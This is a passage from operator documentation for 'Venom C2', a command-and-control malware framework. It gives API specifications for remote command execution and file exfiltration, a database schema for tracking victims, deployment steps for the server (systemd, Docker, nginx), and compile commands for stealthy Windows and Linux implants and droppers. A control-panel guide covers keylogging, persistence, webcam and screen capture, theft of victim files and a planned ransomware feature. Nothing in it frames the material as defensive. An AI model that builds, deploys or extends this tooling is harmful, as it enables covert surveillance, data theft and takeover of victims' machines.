### 8.1.3 Command Submission (Admin)

| Property | Value |
|----------|-------|
| **Endpoint** | `/input-command-to-execute-from-web` |
| **Method** | POST |
| **Authentication** | JWT token in cookie |
| **Content-Type** | application/json |

**Request Body:**
```json
{
    "command": "whoami",           // Command to execute
    "clientid": "aB3xY9-20250115143022"  // Target client ID
}
```

**Response (200 OK):**
```json
{
    "status": "Command sent to the server and queued for client transmission successfully."
}
```

### 8.1.4 Command Polling (Client)

| Property | Value |
|----------|-------|
| **Endpoint** | `/command-transmission-to-client` |
| **Method** | GET |
| **Authentication** | None (client ID as query param) |

**Query Parameters:**
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `clientID` | string | Yes | Client's unique identifier |

**Response (200 OK) - Command Available:**
```json
{
    "nonce": "a1b2c3d4e5f67890",
    "ciphertext": "f9e8d7c6b5a43210f9e8d7c6b5a43210",
    "tag": "1234567890abcdef1234567890abcdef"
}
```

**Response (200 OK) - No Command:**
```json
{
    "command": null
}
```

### 8.1.5 Command Result Submission (Client)

| Property | Value |
|----------|-------|
| **Endpoint** | `/execution-result-of-command-from-client` |
| **Method** | POST |
| **Authentication** | None (client ID as query param) |
| **Content-Type** | application/x-www-form-urlencoded |

**Query Parameters:**
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `clientID` | string | Yes | Client's unique identifier |

**Request Body:**
| Field | Type | Description |
|-------|------|-------------|
| (raw) | string | Base64-encoded encrypted result JSON |

**Response (200 OK):**
```json
{
    "status": "Result received"
}
```

### 8.1.6 Screenshot Upload

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/screenshot` |
| **Method** | POST |
| **Authentication** | None |
| **Content-Type** | multipart/form-data |

**Form Fields:**
| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `file` | file | Yes | Encrypted screenshot (JSON bytes) |
| `client_id` | string | Yes | Client's unique identifier |

**Response (200 OK):**
```json
{
    "status": "success"
}
```

### 8.1.7 File Upload from Client (Exfiltration)

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/download-files-from-client` |
| **Method** | POST |
| **Authentication** | None |
| **Content-Type** | multipart/form-data |

**Form Fields:**
| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `file` | file | Yes | File to upload |

**Response (200 OK):**
```
File uploaded successfully: filename.ext
```

### 8.1.8 Send File to Client (Upload)

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/uploadFromFiles` |
| **Method** | POST |
| **Authentication** | JWT token in cookie |
| **Content-Type** | multipart/form-data |

**Form Fields:**
| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `files[]` | file[] | Yes | One or more files to send |
| `client_id` | string | Yes | Target client ID |

**Response (200 OK):**
```json
{
    "success": true,
    "message": "File successfully uploaded to server to send to client abc123.",
    "files": ["file1.txt", "file2.jpg"]
}
```

### 8.1.9 Multicast Command

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/command-multicast` |
| **Method** | POST |
| **Authentication** | None |
| **Content-Type** | application/json |

**Request Body:**
```json
{
    "platform": "Windows",   // "Windows" or "Linux"
    "command": "whoami"      // Command to broadcast
}
```

**Response (200 OK):**
```json
{
    "success": "Command stored for Windows"
}
```

### 8.1.10 Admin Login

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/login-verify` |
| **Method** | POST |
| **Authentication** | None |
| **Content-Type** | application/json |

**Request Body:**
```json
{
    "codename": "admin",
    "secret": "secret"
}
```

**Response (200 OK):**
```json
{
    "message": "Login successful",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "redirect": "/dashboard"
}
```

### 8.1.11 Get All Clients (Admin)

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/clients` |
| **Method** | GET |
| **Authentication** | JWT token in cookie |

**Response (200 OK):**
```json
["aB3xY9-20250115143022", "cD4wZ8-20250115143500", ...]
```

### 8.1.12 Get Command Logs (Admin)

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/logs` |
| **Method** | GET |
| **Authentication** | JWT token in cookie |

**Query Parameters (all optional):**
| Parameter | Type | Description |
|-----------|------|-------------|
| `client_id` | string | Filter by client ID |
| `initiator` | string | Filter by admin codename |
| `start_time` | string | ISO format start time |
| `end_time` | string | ISO format end time |

**Response (200 OK):**
```json
[
    {
        "log_id": 1,
        "client_id": "aB3xY9-20250115143022",
        "command_initiator": "admin",
        "timestamp": "2025-01-15T14:35:22",
        "command": "whoami",
        "result": "john_doe\n"
    }
]
```

### 8.1.13 Edit Client Nickname (Admin)

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/editNickname` |
| **Method** | POST |
| **Authentication** | JWT token in cookie (admin or superadmin) |
| **Content-Type** | application/json |

**Request Body:**
```json
{
    "client_id": "aB3xY9-20250115143022",
    "nickname": "MainServer"
}
```

**Response (200 OK):**
```json
{
    "success": "Nickname updated successfully."
}
```

### 8.1.14 Create Admin (Superadmin only)

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/createAdmin` |
| **Method** | POST |
| **Authentication** | JWT token (superadmin only) |
| **Content-Type** | application/json |

**Request Body:**
```json
{
    "codename": "newadmin",
    "secret": "securepassword123"
}
```

**Response (201 Created):**
```json
{
    "message": "Admin newadmin added successfully."
}
```

## 8.2 WebSocket Events (Socket.IO)

### Events Emitted by Server

| Event Name | Payload | Description |
|------------|---------|-------------|
| `all_client_list` | `{type: "full_update", clients: [...]}` | Complete list of registered clients |
| `live_client_list` | `{type: "full_update", clients: [...]}` | Clients active in last 12 seconds |
| `command_result` | `{client_id, command, result}` | Result of executed command |

### Events Received by Server

| Event Name | Payload | Description |
|------------|---------|-------------|
| `connect` | None | Client establishes connection |

---

# 9. Database Schema

## 9.1 Entity Relationship Diagram

```
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                              DATABASE SCHEMA                                         │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                                Admin                                         │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │ id (PK)          INTEGER      │ Unique identifier for each admin           │   │
│  │ codename         VARCHAR(80)  │ Login username (unique)                     │   │
│  │ secret           VARCHAR(200) │ bcrypt hash of password                     │   │
│  │ role             VARCHAR(80)  │ "admin" or "superadmin"                     │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                             ClientData                                       │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │ client_id (PK)   VARCHAR(64)  │ Format: {6random}-{timestamp}              │   │
│  │ user             VARCHAR(128) │ Username from whoami                        │   │
│  │ nickname         VARCHAR(128) │ Editable by admin                           │   │
│  │ ip               VARCHAR(64)  │ Public IP address                           │   │
│  │ os               VARCHAR(128) │ "Windows" or "Linux"                        │   │
│  │ registered_at    DATETIME     │ First registration time                     │   │
│  │ last_active      DATETIME     │ Last command poll time                      │   │
│  │ address          VARCHAR(128) │ Geo location from IP                        │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                      │                                              │
│                                      │ 1                                           │
│                                      │                                              │
│                                      ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                           CryptographyData                                   │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │ id (PK)          INTEGER      │ Auto-increment                               │   │
│  │ client_id (FK)   VARCHAR(64)  │ References ClientData.client_id             │   │
│  │ aes_key          BLOB         │ 32-byte AES-256 key                          │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                             CommandsLog                                      │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │ log_id (PK)      INTEGER      │ Auto-increment                               │   │
│  │ client_id (FK)   VARCHAR(64)  │ References ClientData.client_id             │   │
│  │ command_initiator VARCHAR(128)│ Admin codename who issued command           │   │
│  │ commands_history TEXT         │ JSON: {timestamp, command, result}          │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                           TokenBlacklist                                     │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │ id (PK)          INTEGER      │ Auto-increment                               │   │
│  │ token            VARCHAR(500) │ JWT token string (unique)                    │   │
│  │ blacklisted_at   DATETIME     │ When token was revoked                       │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

## 9.2 Table Creation SQL

### Admin Table

```sql
CREATE TABLE admin (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    codename VARCHAR(80) UNIQUE NOT NULL,
    secret VARCHAR(200) NOT NULL,
    role VARCHAR(80) NOT NULL
);

-- Insert default superadmin (password: secret)
-- The actual hash will be generated at runtime
INSERT INTO admin (codename, secret, role) 
VALUES ('admin', '$2b$12$...', 'superadmin');
```

### ClientData Table

```sql
CREATE TABLE client_data (
    client_id VARCHAR(64) PRIMARY KEY,
    user VARCHAR(128) NOT NULL,
    nickname VARCHAR(128) NOT NULL,
    ip VARCHAR(64) NOT NULL,
    os VARCHAR(128) NOT NULL,
    registered_at DATETIME,
    last_active DATETIME,
    address VARCHAR(128) NOT NULL
);

-- Index for faster last_active queries
CREATE INDEX idx_client_last_active ON client_data(last_active);
```

### CryptographyData Table

```sql
CREATE TABLE cryptography_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id VARCHAR(64) NOT NULL,
    aes_key BLOB NOT NULL,
    FOREIGN KEY (client_id) REFERENCES client_data(client_id)
);

-- Index for faster lookups
CREATE INDEX idx_crypto_client_id ON cryptography_data(client_id);
```

### CommandsLog Table

```sql
CREATE TABLE commands_log (
    log_id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id VARCHAR(64) NOT NULL,
    command_initiator VARCHAR(128) NOT NULL,
    commands_history TEXT,
    FOREIGN KEY (client_id) REFERENCES client_data(client_id)
);

-- Index for log filtering
CREATE INDEX idx_logs_client_id ON commands_log(client_id);
CREATE INDEX idx_logs_initiator ON commands_log(command_initiator);
```

### TokenBlacklist Table

```sql
CREATE TABLE token_blacklist (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token VARCHAR(500) UNIQUE NOT NULL,
    blacklisted_at DATETIME NOT NULL
);
```

## 9.3 Sample Queries

### Find Online Clients

```sql
-- Clients that have polled in the last 12 seconds
SELECT client_id, nickname, user, ip, os, last_active
FROM client_data
WHERE julianday('now') - julianday(last_active) <= (12.0 / 86400.0)
ORDER BY last_active DESC;
```

### Get Client Command History

```sql
-- Last 20 commands for a specific client, most recent first
SELECT 
    cl.log_id,
    cl.command_initiator,
    cl.commands_history,
    json_extract(cl.commands_history, '$.timestamp') as cmd_time,
    json_extract(cl.commands_history, '$.command') as command,
    json_extract(cl.commands_history, '$.result') as result
FROM commands_log cl
WHERE cl.client_id = 'aB3xY9-20250115143022'
ORDER BY cl.log_id DESC
LIMIT 20;
```

### Admin Activity Summary

```sql
-- Count commands per admin
SELECT 
    command_initiator,
    COUNT(*) as command_count,
    COUNT(DISTINCT client_id) as distinct_clients
FROM commands_log
GROUP BY command_initiator
ORDER BY command_count DESC;
```

### Clean Old Logs (30+ days)

```sql
DELETE FROM commands_log 
WHERE julianday('now') - julianday(
    json_extract(commands_history, '$.timestamp')
) > 30;
```

---

# 10. Deployment Guide

## 10.1 Server Deployment (Production)

### Prerequisites

| Requirement | Minimum | Recommended |
|-------------|---------|-------------|
| **CPU** | 1 core | 2+ cores |
| **RAM** | 1 GB | 2+ GB |
| **Storage** | 10 GB | 50+ GB |
| **OS** | Ubuntu 20.04+ | Ubuntu 22.04 LTS |
| **Python** | 3.8+ | 3.10+ |
| **Network** | Static IP or domain | Domain with valid SSL |

### Step-by-Step Installation

#### Step 1: System Update & Dependencies

```bash
# Update package list
sudo apt update && sudo apt upgrade -y

# Install required packages
sudo apt install -y python3 python3-pip python3-venv git openssl

# Create C2 directory
sudo mkdir -p /opt/venom-c2
sudo chown $USER:$USER /opt/venom-c2
cd /opt/venom-c2
```

#### Step 2: Create Virtual Environment

```bash
# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate

# Upgrade pip
pip install --upgrade pip
```

#### Step 3: Install Python Dependencies

```bash
# Copy requirements file to server
# requirements-linux.txt should be in the current directory

pip install -r requirements-linux.txt
```

#### Step 4: Generate SSL Certificates

```bash
# For production, use a valid CA-signed certificate
# For testing, generate self-signed:

openssl req -x509 -nodes -days 365 -newkey rsa:4096 \
    -keyout key.pem -out cert.pem \
    -subj "/C=US/ST=State/L=City/O=Organization/CN=venom.c2"
```

#### Step 5: Configure Environment

```bash
# Create .env file
cat > .env << 'EOF'
# JWT Configuration
JWT_SECRET_KEY=$(openssl rand -hex 32)

# RSA Keys (will be generated on first run if empty)
PUBLIC_KEY_FOR_AES_KEY_EXCHANGE=""
PRIVATE_KEY_FOR_AES_KEY_EXCHANGE=""

# Server Configuration
DEBUG=False
HOST=0.0.0.0
PORT=5000

# File Upload Limits
MAX_CONTENT_LENGTH=104857600
EOF
```

#### Step 6: Create Required Directories

```bash
mkdir -p instance uploads KEYLOG_DIR static
```

#### Step 7: Copy Binary Files

```bash
# Copy compiled binaries to static/ directory
cp /path/to/client.exe static/
cp /path/to/client.bin static/
cp /path/to/dropper.exe static/
cp /path/to/dropper static/
cp /path/to/video_windows.dll static/
cp /path/to/photo_capture_windows.dll static/
cp /path/to/video.so static/
cp /path/to/photo_capture.so static/
```

#### Step 8: Run the Server

```bash
# For testing
python app.py

# For production (using gunicorn with gevent)
pip install gunicorn gevent
gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \
    -w 1 \
    -b 0.0.0.0:5000 \
    --certfile=cert.pem \
    --keyfile=key.pem \
    app:app
```

### Systemd Service (Recommended for Production)

Create service file:

```bash
sudo nano /etc/systemd/system/venom-c2.service
```

Contents:

```ini
[Unit]
Description=Venom C2 Framework
After=network.target

[Service]
Type=simple
User=www-data
Group=www-data
WorkingDirectory=/opt/venom-c2
Environment="PATH=/opt/venom-c2/venv/bin"
ExecStart=/opt/venom-c2/venv/bin/gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker -w 1 -b 0.0.0.0:5000 --certfile=cert.pem --keyfile=key.pem app:app
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Enable and start:

```bash
sudo systemctl daemon-reload
sudo systemctl enable venom-c2
sudo systemctl start venom-c2
sudo systemctl status venom-c2
```

## 10.2 Client Compilation

### Windows Client

```bash
# From a Linux machine with mingw cross-compiler
# Install mingw: sudo apt install gcc-mingw-w64-x86-64

# Compile video capture DLL
x86_64-w64-mingw32-gcc -shared -o video_windows.dll video_windows.c -lole32 -loleaut32 -luuid -O2

# Compile photo capture DLL
x86_64-w64-mingw32-gcc -shared -o photo_capture_windows.dll photo_capture_windows.c -lole32 -loleaut32 -luuid -O2

# Compile dropper (requires Go)
GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o dropper.exe dropper.go

# Compile Python client (requires Nuitka)
pip install nuitka
python -m nuitka --standalone --onefile --windows-disable-console --windows-icon-from-ico=icon.ico --output-dir=build client.py
cp build/client.exe static/
```

### Linux Client

```bash
# On the target Linux machine (or matching architecture)

# Compile video capture SO
gcc -shared -fPIC -o video.so video.c -O2

# Compile photo capture SO
gcc -shared -fPIC -o photo_capture.so photo_capture.c -O2

# Compile dropper
gcc -o dropper dropper_l.c -lcurl -O2

# Compile Python client
pip install nuitka
python -m nuitka --standalone --onefile --output-dir=build client.py
cp build/client.bin static/
```

## 10.3 Docker Deployment

### Dockerfile

```dockerfile
FROM python:3.11-slim

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    gcc \
    libv4l-dev \
    openssl \
    && rm -rf /var/lib/apt/lists/*

# Copy requirements and install Python packages
COPY requirements-linux.txt .
RUN pip install --no-cache-dir -r requirements-linux.txt gunicorn gevent gevent-websocket

# Copy application files
COPY . .

# Generate self-signed SSL certificates (replace with real certs in production)
RUN openssl req -x509 -nodes -days 365 -newkey rsa:4096 \
    -keyout key.pem -out cert.pem \
    -subj "/CN=venom.c2"

# Create directories
RUN mkdir -p instance uploads KEYLOG_DIR

# Expose port
EXPOSE 5000

# Run with gunicorn
CMD ["gunicorn", "-k", "geventwebsocket.gunicorn.workers.GeventWebSocketWorker", "-w", "1", "-b", "0.0.0.0:5000", "--certfile=cert.pem", "--keyfile=key.pem", "app:app"]
```

### Docker Compose

```yaml
version: '3.8'

services:
  venom-c2:
    build: .
    container_name: venom-c2
    restart: unless-stopped
    ports:
      - "5000:5000"
    volumes:
      - ./instance:/app/instance
      - ./uploads:/app/uploads
      - ./KEYLOG_DIR:/app/KEYLOG_DIR
    environment:
      - JWT_SECRET_KEY=${JWT_SECRET_KEY}
    env_file:
      - .env
```

## 10.4 Nginx Reverse Proxy (Optional)

```nginx
server {
    listen 443 ssl http2;
    server_name venom.c2;

    ssl_certificate /opt/venom-c2/cert.pem;
    ssl_certificate_key /opt/venom-c2/key.pem;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        proxy_pass https://127.0.0.1:5000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

---

# 11. Web Interface Guide

## 11.1 Dashboard Overview

The dashboard (`/dashboard`) is the primary interface for operators. It consists of several components:

```
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                        DASHBOARD LAYOUT                                              │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                              HEADER BAR                                      │   │
│  │  [Logo] Hacker C2 Dashboard                                    [Logout]    │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                              MAIN CONTENT                                     │   │
│  │                                                                              │   │
│  │  ┌─────────────┐  ┌─────────────────────────────────────────────────────┐   │   │
│  │  │   SIDEBAR   │  │                  AGENTS TABLE                        │   │   │
│  │  │             │  │  ┌────────────┬─────────┬─────┬────────────┬──────┐  │   │   │
│  │  │ • Agents    │  │  │ Client ID  │Nickname │ OS  │Last Active │More  │  │   │   │
│  │  │ • Logs      │  │  ├────────────┼─────────┼─────┼────────────┼──────┤  │   │   │
│  │  │ • Commands  │  │  │ aB3xY9-... │Server1  │Win  │2s ago      │[Act] │  │   │   │
│  │  │ • Files     │  │  │ cD4wZ8-... │Laptop   │Lin  │15s ago     │[Act] │  │   │   │
│  │  │ • API Docs  │  │  └────────────┴─────────┴─────┴────────────┴──────┘  │   │   │
│  │  │             │  └─────────────────────────────────────────────────────┘   │   │
│  │  └─────────────┘                                                             │   │
│  │                                                                              │   │
│  │  ┌─────────────────────────────────────────────────────────────────────┐   │   │
│  │  │                         TERMINAL (iframe)                           │   │   │
│  │  │                                                                      │   │   │
│  │  │  ┌─────────┬────────────────────────────────────────────────────┐  │   │   │
│  │  │  │ Tab 1   │ Tab 2                                               │  │   │   │
│  │  │  ├─────────┼────────────────────────────────────────────────────┤  │   │   │
│  │  │  │         │ user@client > whoami                                │  │   │   │
│  │  │  │         │ administrator                                       │  │   │   │
│  │  │  │         │                                                     │  │   │   │
│  │  │  │         │ user@client >                                       │  │   │   │
│  │  │  └─────────┴────────────────────────────────────────────────────┘  │   │   │
│  │  └─────────────────────────────────────────────────────────────────────┘   │   │
│  │                                                                              │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                              FOOTER                                          │   │
│  │  © 2024 Hacker C2 Dashboard | All Rights Reserved                           │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

## 11.2 Sidebar Navigation

| Menu Item | Purpose | When to Use |
|-----------|---------|-------------|
| **Agents** | View and manage connected clients | Default view, shows all registered clients |
| **Logs** | View command execution history | Review past actions, audit trail |
| **Commands** | Send multicast commands | Broadcast same command to all Windows or all Linux clients |
| **Files** | Browse uploaded files | Download exfiltrated files, manage server file storage |
| **API Docs** | Open Swagger documentation | Reference API endpoints |

## 11.3 Agents Table

### Columns Explained

| Column | Description | Interactive |
|--------|-------------|-------------|
| **Client ID** | Unique identifier (format: `{6random}-{timestamp}`) | Not interactive |
| **Nickname** | Editable display name | Click edit (hover over header) |
| **OS** | Windows or Linux | Status indicator |
| **Last Active** | Time since last poll | Shows red/green dot |
| **More Actions** | "Perform actions" button | Opens malware control modal |

### Status Indicators

- **🟢 Green dot**: Client polled within last 7 seconds (online)
- **🔴 Red dot**: Client hasn't polled in >7 seconds (offline)

### Editing Nicknames

1. Hover mouse over "Nickname" column header
2. Click "Edit" button that appears
3. Select client from dropdown
4. Enter new nickname
5. Click Submit

## 11.4 Malware Control Modal

This modal appears when clicking "Perform actions" for a client.

### Panel 1: Agent Information

| Field | Description |
|-------|-------------|
| Client ID | Unique identifier |
| Nickname | Display name |
| OS | Operating system |
| Username | Whoami result |
| Public IP | External IP address |
| Registered At | First connection time |
| Geo Location | City, region, country |
| Last Active | Last poll time |
| Status | Online/Offline |

### Panel 2: Send File

Two modes:

**Mode A: Upload from Server**
- Enter absolute file path on C2 server
- Example: `/opt/venom-c2/uploads/tool.exe`
- File is read from server and sent to client

**Mode B: Upload from Local Files**
- Drag & drop files or click to select
- Files are uploaded to server first, then queued for client
- Multiple files supported

### Panel 3: Establish Persistence

Adds persistence mechanism to the client:
- **Windows**: Registry Run key
- **Linux**: Cron job

Click "Confirm" to execute.

### Panel 4: Kill Agent

Terminates the agent process on the client. The client will stop running until restarted by persistence mechanism.

### Panel 5: Start/Stop Keylogger

- **Start Keylogger**: Begins capturing keystrokes
- **Stop Keylogger**: Stops capturing and sends remaining buffer

Keylog data is saved to `KEYLOG_DIR/{client_id}-keylog.txt` on the server.

### Panel 6: Deploy Ransomware

*Placeholder for future implementation*. Currently shows alert.

### Panel 7: Exfiltrate Data

Enter file path on the client to upload to server. Example: `C:\Users\victim\Documents\secret.docx`

File is saved in `uploads/` directory.

### Panel 8: Capture Photo

Takes a single photo from the client's webcam. Saved as `uploads/Captured_photos/{client_id}-photo-{timestamp}.jpg`

### Panel 9: Capture Screenshot

Takes a screenshot of the client's desktop. Saved as `uploads/{client_id}-{timestamp}.png`

### Panel 10: Record Video

Records video from client's webcam. Parameters:
- **FPS**: Frames per second (1-60)
- **Record Time**: Duration in seconds

Opens `/video` page in new tab to view the stream.

### Panel 11: Screenshare

Starts live screen sharing. Parameters:
- **FPS**: Frames per second (1-20)

Opens `/screenshare` page in new tab to view live feed. Auto-stops when tab is closed.

## 11.5 Terminal Interface

The terminal is an iframe that loads `/terminal` endpoint. Features:

- **Tabs**: One tab per connected client
- **Command Input**: Type commands at prompt
- **Command History**: Scrollable output
- **Real-time Updates**: Results appear as they arrive

### Terminal Commands

| Command | Description | Example |
|---------|-------------|---------|
| `help` | List available commands | `help` |
| `clear` | Clear terminal screen | `clear` |
| Any shell command | Execute on client | `whoami`, `ipconfig`, `ls -la` |

## 11.6 Screenshare Viewer

URL format: `/screenshare?clientID={client_id}&fps={fps}`

Features:
- Live screen feed (refreshes at specified FPS)
- Record button (saves as WebM)
- Full-screen toggle
- Auto-stops when tab is closed

## 11.7 Video Player

URL: `/video`

Features:
- Live MJPEG stream from client webcam
- Screenshot capture
- Recording (saves as WebM)
- Resizable video window
- Full-screen mode

## 11.8 Logs Viewer

URL: `/logs` (or via sidebar)

Features:
- Filter by client ID
- Filter by initiator (admin codename)
- Filter by time range
- Export to PDF

## 11.9 File Explorer

URL: via "Files" sidebar menu

Features:
- Browse `uploads/` directory
- Download files
- Navigate subdirectories
- Breadcrumb navigation

## 11.10 Super Admin Panel

URL: `/super-admin-panel` (only visible to superadmin users)

Features:
- Change superadmin password
- Create new admin accounts
- Delete admin accounts
- Change other admin passwords

---

# 12. Operational Features

## 12.1 Command Types Explained

### Standard Shell Commands

These are passed directly to the system shell. Examples:

| Command | Windows | Linux |
|---------|---------|-------|
| List files | `dir` | `ls -la` |
| Show current user | `whoami` | `whoami` |
| Network info | `ipconfig /all` | `ifconfig` or `ip a` |
| Process list | `tasklist` | `ps aux` |
| System info | `systeminfo` | `uname -a` |
| Create directory | `mkdir folder` | `mkdir folder` |
| Delete file | `del file.txt` | `rm file.txt` |
| Copy file | `copy source dest` | `cp source dest` |
| Move file | `move source dest` | `mv source dest` |
| Download file | `curl -O url` | `wget url` |

### Special Commands

These are handled internally by the client:

| Command | Description | Implementation |
|---------|-------------|----------------|
| `cd <path>` | Change directory | Python `os.chdir()` |
| `screenshot` | Capture screen | Python `mss` library |
| `capture_photo` | Capture webcam | Native DLL/SO |
| `start_keylog` | Begin keylogging | Python hooks |
| `stop_keylog` | Stop keylogging | Python hooks |
| `start_video-<fps>-<duration>` | Record video | Native DLL/SO |
| `stop_video` | Stop recording | Native function call |
| `start_screenshare_<fps>` | Start screen share | Python `mss` loop |
| `stop_screenshare` | Stop screen share | Thread stop event |
| `download <filepath>` | Upload file to server | Python file read |
| `kill_agent` | Terminate agent | `sys.exit(0)` |

## 12.2 Multicast Commands

**Purpose**: Send the same command to all clients of a specific operating system simultaneously.

**How it works**:
1. Admin enters command in multicast section
2. Server stores command with timestamp (valid for 5 seconds)
3. Any client of matching OS that polls within 5 seconds receives the command
4. After 5 seconds, command is automatically cleared

**Use Cases**:
- Update all agents: `client_update`
- Run discovery on all machines: `whoami && hostname && ipconfig`
- Deploy emergency kill: `kill_agent`

**Limitations**:
- 5-second window means offline clients miss the command
- Not guaranteed delivery (use individual commands for critical operations)

## 12.3 File Transfer

### Upload to Client (Push)

```
┌──────────┐    1. Admin selects file     ┌──────────┐
│  Admin   │─────────────────────────────▶│  Server  │
│ Browser  │                              │          │
└──────────┘                              └────┬─────┘
                                               │
                                    2. Queue command
                                    with filename
                                               │
                                               ▼
┌──────────┐    3. Client polls, gets command ┌──────────┐
│  Client  │◀─────────────────────────────────│  Server  │
└────┬─────┘                                  └──────────┘
     │
     │ 4. GET /api/upload-file-to-client?filename=...
     │
     ▼
┌──────────┐    5. Encrypted file transfer    ┌──────────┐
│  Client  │─────────────────────────────────▶│  Server  │
└──────────┘                                  └──────────┘
     │
     │ 6. Decrypt and save
     │
     ▼
  File saved
```

### Download from Client (Pull)

```
┌──────────┐    1. Admin enters file path    ┌──────────┐
│  Admin   │─────────────────────────────▶   │  Server  │
│ Browser  │   "download C:\secret\file.txt" │          │
└──────────┘                                 └────┬─────┘
                                                   │
                                        2. Queue command
                                                   │
                                                   ▼
┌──────────┐    3. Client polls, gets command    ┌──────────┐
│  Client  │◀────────────────────────────────────│  Server  │
└────┬─────┘                                     └──────────┘
     │
     │ 4. Read file from disk
     │
     ▼
┌──────────┐    5. Encrypted file transfer       ┌──────────┐
│  Client  │────────────────────────────────────▶│  Server  │
└──────────┘  POST /api/download-files-from-client └────┬─────┘
                                                         │
                                              6. Save to
                                              uploads/
                                                         │
                                                         ▼
┌──────────┐    7. Admin downloads            ┌──────────┐
│  Admin   │◀─────────────────────────────────│  Server  │
│ Browser  │  GET /download/file.txt          │          │
└──────────┘                                  └──────────┘
```

## 12.4 Screen Sharing

### Architecture

```
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                           SCREEN SHARING ARCHITECTURE                                │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  Client Machine                                 C2 Server           Admin Browser  │
│                                                                                     │
│  ┌─────────────────┐                           ┌─────────────────┐  ┌───────────┐  │
│  │  Python Agent   │                           │    Flask        │  │  Browser  │  │
│  │                 │                           │    Server       │  │           │  │
│  │  while True:    │                           │                 │  │  <img src=│  │
│  │    screenshot=  │                           │  ┌─────────────┐ │  │   "/api/  │  │
│  │    mss.grab()   │                           │  │ Screenshot  │ │  │   view-   │  │
│  │    send_to_     │                           │  │   storage   │ │  │   screen- │  │
│  │    server()     │                           │  │  (overwrite)│ │  │   share"  │  │
│  │    sleep(1/fps) │                           │  └──────┬──────┘ │  │   />      │  │
│  └────────┬────────┘                           │         │        │  └───────────┘  │
│           │                                     │         │        │       │        │
│           │ POST /api/screenshare              │         │        │       │        │
│           │ (screenshot.png)                   │         │        │       │        │
│           └────────────────────────────────────▶│         │        │       │        │
│                                                 │    save │        │       │        │
│                                                 │    as   │        │       │        │
│                                                 │    {id}-│        │       │        │
│                                                 │    latest│       │       │        │
│                                                 │    .png │        │       │        │
│                                                 │         │        │       │        │
│                                                 │         │        │       │        │
│                                                 │         │        │ GET    │        │
│                                                 │         │        │◀──────┘        │
│                                                 │         │        │ (every 1/fps s)│
│                                                 │         │        │       │        │
│                                                 │         │ serve  │       │        │
│                                                 │         │────────┼──────▶│        │
│                                                 │         │        │       │        │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

### FPS Selection

- Lower FPS (1-5): Saves bandwidth, good for slow connections
- Medium FPS (10-15): Smooth enough for monitoring, moderate bandwidth
- High FPS (20): Maximum smoothness, high bandwidth usage

## 12.5 Video Recording

### Video Flow

```
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                           VIDEO RECORDING ARCHITECTURE                               │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  Client Machine                                 C2 Server           Admin Browser  │
│                                                                                     │
